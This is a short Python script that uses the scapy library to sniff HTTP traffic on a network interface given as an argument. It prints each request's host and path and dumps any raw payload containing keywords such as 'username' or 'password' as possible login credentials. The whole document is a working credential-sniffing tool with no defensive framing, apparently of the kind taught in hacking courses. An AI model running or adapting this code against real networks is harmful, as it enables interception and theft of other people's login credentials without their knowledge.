import scapy.all as scapy
from scapy.layers import http
import argparse

def get_argument():
	parser=argparse.ArgumentParser()
	parser.add_argument("-i","--interface",dest="interface",help="Interface to sniff packet")
	options=parser.parse_args()
	return options

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			load=packet[scapy.Raw].load
			keywords=["username","user","login","password","pass"]
			for keyword in keywords:
				if keyword in str(load):
					return load 

def sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url=get_url(packet)
		print("HTTP Request "+str(url))
		login_info=get_login_info(packet)
		if login_info:
			print("\n\n Possible username/password "+str(login_info)+"\n\n")

option=get_argument()
sniff(option.interface)
		

